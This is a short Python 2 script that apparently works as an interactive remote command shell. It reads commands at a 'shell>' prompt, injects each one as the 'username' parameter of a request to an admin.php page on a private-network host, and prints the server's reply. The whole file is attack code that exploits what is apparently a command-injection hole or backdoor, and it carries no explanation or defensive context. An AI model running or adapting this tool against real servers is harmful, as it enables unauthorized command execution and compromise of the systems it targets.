#!/usr/bin/env python
from urllib import urlencode
import requests, sys

url = "http://192.168.43.93/admin.php"

while True:
	cmd = raw_input("shell> ")
	params = (('username', cmd), ('password', ''))
	res = requests.get(url, params=urlencode(params))
	print(cmd, res.status_code,res.url)
	print(res.content)